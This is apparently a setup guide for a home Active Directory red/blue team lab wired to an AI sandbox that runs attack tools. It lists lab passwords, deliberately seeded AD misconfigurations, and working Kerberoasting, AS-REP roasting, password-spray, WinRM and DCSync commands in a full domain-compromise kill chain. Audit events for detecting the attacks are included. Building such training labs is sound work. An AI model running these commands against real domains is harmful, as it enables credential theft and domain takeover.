# Portal 5 — Lab Environment Setup

Active Directory red/blue team lab integrated with the Portal 5 lab-exec sandbox lane.

**Domain**: `portal.lab`  
**Hypervisor**: Proxmox VE at `10.0.0.203` (node: `proxmox3`)  
**Lab network**: VLAN 60 (`10.10.60.0/24`) on `vmbr0`  
**MCP control plane**: Portal Proxmox MCP at `:8927`

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  Proxmox VE  10.0.0.203                                     │
│                                                             │
│  ┌──────────────────┐   ┌──────────────────┐               │
│  │  lab-dc01        │   │  lab-srv01        │               │
│  │  vmid 110        │   │  vmid 111         │               │
│  │  Win Server 2022 │   │  Win Server 2022  │               │
│  │  portal.lab DC   │   │  Member server    │               │
│  │  DNS / AD DS     │   │  IIS / WinRM      │               │
│  │  VLAN 60         │   │  VLAN 60          │               │
│  └──────────────────┘   └──────────────────┘               │
│           │                       │                         │
│  ─────────┴───────────────────────┴── vmbr0 tag=60 ─────   │
└─────────────────────────────────────────────────────────────┘
         │ (VPN / routed path to VLAN 60)
┌─────────────────────────────────────────────────────────────┐
│  Portal 5 (Mac host)                                        │
│  ┌──────────────────────────────────────────────────────┐   │
│  │  portal5-dind (Docker-in-Docker)                     │   │
│  │  ┌──────────────────────────────────────────────┐    │   │
│  │  │  portal5-attack container (lab-exec lane)    │    │   │
│  │  │  nmap / nxc / impacket / certipy / bloodhound│    │   │
│  │  │  → routes to 10.10.60.0/24                   │    │   │
│  │  └──────────────────────────────────────────────┘    │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## VM Specs

| VM | vmid | Disk | RAM | Cores | Role |
|---|---|---|---|---|---|
| lab-dc01 | 110 | 60 GB (SSD1) | 4 GB | 2 | AD DC, DNS, portal.lab |
| lab-srv01 | 111 | 40 GB (SSD1) | 4 GB | 2 | Member server, IIS, WinRM |

Both VMs:
- OS: Windows Server 2022 Standard Evaluation (Desktop Experience)
- Network: `vmbr0`, VLAN tag 60 (DHCP from your VLAN 60 router)
- BIOS: OVMF (UEFI)
- VirtIO disk + VirtIO NIC (requires VirtIO drivers during install)
- QEMU guest agent for Proxmox API control

---

## First-Time Setup

### Prerequisites

1. Proxmox API token in `.env`:
   ```
   PROXMOX_URL=https://10.0.0.203:8006
   PROXMOX_TOKEN_ID=root@pam!portal
   PROXMOX_TOKEN_SECRET=<uuid from Proxmox UI>
   PROXMOX_VERIFY_SSL=false
   PROXMOX_DEFAULT_NODE=proxmox3
   ```

2. VMs already exist (vmid 110, 111). Verify via Proxmox MCP or web UI.

3. Proxmox MCP container running:
   ```bash
   docker compose ps portal5-mcp-proxmox
   # If not: ./launch.sh up
   ```

### Step 1 — Windows install on lab-dc01 (interactive, ~15 min)

Open the Proxmox web console:
```
https://10.0.0.203:8006 → proxmox3 → 110 (lab-dc01) → Console
```

Click through the Windows Server 2022 installer:
1. Language/region → Next → **Install Now**
2. Select **Windows Server 2022 Standard Evaluation (Desktop Experience)** → Next
3. Accept license → Next
4. **Custom: Install Windows only (advanced)**
5. You'll see "No drives found" — click **Load driver** → Browse
   - Navigate to `E:\vioscsi\2k22\amd64` (VirtIO CD is on E:)
   - Select **Red Hat VirtIO SCSI controller** → Next
6. The 60 GB drive appears → select it → Next
7. Wait ~10 minutes for installation + reboot
8. Set Administrator password: `LabAdmin1!`

Then install the QEMU guest agent (required for automation):
- Open File Explorer → E:\guest-agent → run `qemu-ga-x86_64.msi`
- Accept defaults, Finish

### Step 2 — Windows install on lab-srv01 (interactive, ~15 min)

Same process at:
```
https://10.0.0.203:8006 → proxmox3 → 111 (lab-srv01) → Console
```
- Same driver load, same password: `LabAdmin1!`
- Same QEMU guest agent install from `E:\guest-agent\qemu-ga-x86_64.msi`

### Step 3 — Automated provisioning

Once both Windows installs are complete and the QEMU guest agent is installed, run:

```bash
python3 scripts/lab_setup.py
```

This takes ~15 minutes and does everything automatically:
- Phase 0: Verifies QEMU agent is reachable on both VMs
- Phase 1: Takes "baseline-clean" snapshots before any changes
- Phase 2: Installs AD DS, promotes lab-dc01 to portal.lab DC (auto-reboots)
- Phase 3: Gets VM IPs, updates `.env` with `LAB_TARGET_DC`, `LAB_TARGET_SRV`
- Phase 4: Seeds AD misconfigurations (users, SPNs, ACLs, GPOs)
- Phase 5: Joins lab-srv01 to domain, installs IIS + WinRM (auto-reboots)
- Phase 6: Takes "baseline-ad" snapshots, enables lab-exec lane in `.env`
- Phase 7: Prints the attack cheatsheet

You can resume from any phase if interrupted:
```bash
python3 scripts/lab_setup.py --phase 3   # start from IP discovery
python3 scripts/lab_setup.py --phase 4   # re-seed AD only
python3 scripts/lab_setup.py --phase 5   # re-provision SRV only
```

### Step 4 — Build the attack image

```bash
./launch.sh build-lab-attack
docker compose restart mcp-sandbox
```

---

## Lab Credentials

| Account | Password | Notes |
|---|---|---|
| Administrator | `LabAdmin1!` | Local + domain admin |
| PORTAL\tyrion.lannister | `Imp1234!` | Domain Admin member |
| PORTAL\cersei.lannister | `Power123!` | IT Admins group |
| PORTAL\arya.stark | `Winter1!` | AS-REP target (no pre-auth) |
| PORTAL\ned.stark | `Honor123!` | AS-REP target (no pre-auth) |
| PORTAL\jon.snow | `Ghost123!` | Regular user |
| PORTAL\daenerys.t | `Dragons1!` | Regular user |
| svc_mssql | `Mssql2022!` | Kerberoast target (SPN: MSSQLSvc) |
| svc_iis | `IisAdmin1!` | Kerberoast + unconstrained delegation |
| svc_backup | `Backup123!` | Kerberoast + unconstrained deleg + GenericAll ACL on DA |
| localadmin | `LabAdmin1!` | Local admin on lab-srv01 (WinRM) |

---

## AD Misconfigurations (Attack Paths)

### Kerberoasting
Three service accounts with SPNs:
```
svc_mssql  → MSSQLSvc/lab-srv01.portal.lab:1433
svc_iis    → HTTP/lab-srv01.portal.lab
svc_backup → backup/lab-srv01.portal.lab
```
Attack:
```bash
impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! \
    -dc-ip $LAB_TARGET_DC -outputfile hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
Two accounts with pre-authentication disabled:
```
arya.stark, ned.stark
```
Attack:
```bash
impacket-GetNPUsers portal.lab/ -usersfile users.txt -dc-ip $LAB_TARGET_DC \
    -outputfile hashes.asrep -no-pass
```

### Unconstrained Delegation
`svc_backup` and `svc_iis` have unconstrained Kerberos delegation.
A DA or machine account coerced to authenticate to these accounts gives you their TGT.
Tools: Rubeus, Responder + mitm6 for coercion.

### ACL Abuse
`svc_backup` has `GenericAll` on the `Domain Admins` group.
Once you have svc_backup's password (via Kerberoasting), add any user to DA:
```powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "arya.stark"
```

### Password Spray
All LabUsers have weak passwords. Spray with:
```bash
nxc smb $LAB_TARGET_DC -u users.txt -p passwords.txt --continue-on-success
```

### Privilege Escalation
`tyrion.lannister` is a direct Domain Admin member — lateral movement target.

### WinRM / PowerShell Remoting
lab-srv01 has WinRM enabled with `TrustedHosts=*`:
```bash
nxc winrm $LAB_TARGET_WS -u localadmin -p LabAdmin1! -x "whoami"
evil-winrm -i $LAB_TARGET_WS -u localadmin -p LabAdmin1!
```

---

## Lab-Exec Lane

The code sandbox MCP runs attack tools against the lab when `SANDBOX_LAB_EXEC=true`.

`.env` keys (populated by `lab_setup.py`):
```bash
SANDBOX_LAB_EXEC=true
SANDBOX_LAB_IMAGE=portal5-attack:latest
LAB_TARGET_DC=<dc01 IP>
LAB_TARGET_WS=<srv01 IP>
LAB_TARGET_SRV=<srv01 IP>
LAB_TARGET_NETWORK=10.10.60.0/24
```

**Attack tools available in portal5-attack**:
- `nmap` — port/service scanning
- `nxc` (NetExec) — SMB/WinRM/LDAP enumeration and spray
- `impacket-*` — GetUserSPNs, GetNPUsers, secretsdump, psexec, smbclient, etc.
- `certipy-ad` — Active Directory Certificate Services attacks
- `bloodhound-python` — AD graph collection
- `responder` — LLMNR/NBT-NS/MDNS poisoning

Example — run from a portal security workspace chat:
```
Enumerate the lab DC at $LAB_TARGET_DC. Run nmap, then bloodhound collection.
```
The sandbox will exec these tools against the live VLAN 60 machines.

---

## Proxmox MCP Operations

All lifecycle management is available via the Portal Proxmox MCP tools in Open WebUI.

### Start/stop lab
```
proxmox_vm_start(vmid=110)   # start lab-dc01
proxmox_vm_start(vmid=111)   # start lab-srv01
proxmox_vm_stop(vmid=110)    # graceful stop
proxmox_vm_stop(vmid=111)
```

### Snapshot (revert to clean state)
```
proxmox_vm_rollback(vmid=110, snapname="baseline-ad")
proxmox_vm_rollback(vmid=111, snapname="baseline-ad")
```

### List snapshots
```
proxmox_list_snapshots(vmid=110)
```

### Full reset after red team exercise

```bash
python3 - <<'EOF'
import asyncio, os, sys
sys.path.insert(0, ".")
with open(".env") as f:
    [os.environ.setdefault(*l.strip().partition("=")[::2]) for l in f
     if "=" in l and not l.startswith("#")]
from portal_mcp.proxmox.proxmox_mcp import _client, _post

async def reset():
    async with _client() as c:
        # Stop VMs
        for vmid in [110, 111]:
            try:
                await _post(c, f"/nodes/proxmox3/qemu/{vmid}/status/stop", forceStop=True)
            except Exception: pass
        await asyncio.sleep(15)
        # Rollback to baseline
        for vmid in [110, 111]:
            await _post(c, f"/nodes/proxmox3/qemu/{vmid}/snapshot/baseline-ad/rollback")
        await asyncio.sleep(5)
        # Start again
        for vmid in [110, 111]:
            await _post(c, f"/nodes/proxmox3/qemu/{vmid}/status/start")
        print("Lab reset to baseline-ad, VMs starting...")

asyncio.run(reset())
EOF
```

---

## Events

### Incalmo Red Team Exercise
**Objective**: Full domain compromise of portal.lab starting with zero credentials.

Suggested kill chain:
1. **Recon**: `nmap -sV -sC $LAB_TARGET_NETWORK`
2. **LDAP enum**: `nxc ldap $LAB_TARGET_DC -u '' -p '' --users`
3. **AS-REP roast**: `impacket-GetNPUsers portal.lab/ -dc-ip $LAB_TARGET_DC -no-pass -usersfile users.txt`
4. **Crack hash** → get arya.stark or ned.stark password
5. **Kerberoast** with their creds → crack svc_backup
6. **ACL abuse**: svc_backup → add yourself to Domain Admins
7. **DCSync**: `impacket-secretsdump portal.lab/arya.stark:Winter1!@$LAB_TARGET_DC`
8. **Golden ticket** / persistence

### Talon Blue Team Exercise
**Objective**: Detect and respond to the Incalmo kill chain.

Enable Windows audit policies on the DC (run on DC via QEMU agent or in PowerShell):
```powershell
auditpol /set /category:"Account Logon" /success:enable /failure:enable
auditpol /set /category:"DS Access" /success:enable /failure:enable
auditpol /set /category:"Privilege Use" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable
```

Detection events to watch:
- **Event 4768**: AS-REP (Kerberos pre-auth disabled account requested TGT)
- **Event 4769**: Kerberoasting (RC4 encryption requested for service ticket)
- **Event 5136**: DS object modification (ACL changes on privileged groups)
- **Event 4728**: Member added to security group (Domain Admins modification)
- **Event 4672**: Special logon (DA account interactive logon from non-DC)

### Purple Team
Run both exercises simultaneously — red team attacks, blue team detects in real time.
Reset between rounds with `baseline-ad` snapshot rollback.

---

## Troubleshooting

**QEMU agent not responding after Windows install**:
- Go to Proxmox console → open E: drive → guest-agent → run `qemu-ga-x86_64.msi`
- Then: Services → "QEMU Guest Agent" → Start + set to Automatic

**VM IP not found**:
- Check VLAN 60 DHCP server is running and has the subnet configured
- Verify `net0` config: `virtio,bridge=vmbr0,tag=60` — the tag must match your switch config

**Domain join fails on lab-srv01**:
- Verify lab-dc01 IP is reachable from lab-srv01: `ping $LAB_TARGET_DC`
- DNS must point at DC: `Set-DnsClientServerAddress -InterfaceIndex 1 -ServerAddresses $LAB_TARGET_DC`
- Re-run from phase 5: `python3 scripts/lab_setup.py --phase 5`

**Attack tools can't reach lab from portal5-attack container**:
- Verify `SANDBOX_LAB_EXEC=true` in `.env` and sandbox MCP was restarted
- Check DinD bridge routing: the container needs a route to VLAN 60 (10.10.60.0/24)
- If VLAN 60 is not directly routed from your Mac/DinD bridge, add a static route:
  `sudo route add -net 10.10.60.0/24 <gateway>`

**Snapshot rollback fails**:
- VM must be stopped first: `proxmox_vm_stop(vmid=110)`
- Wait 10 seconds, then rollback, then start
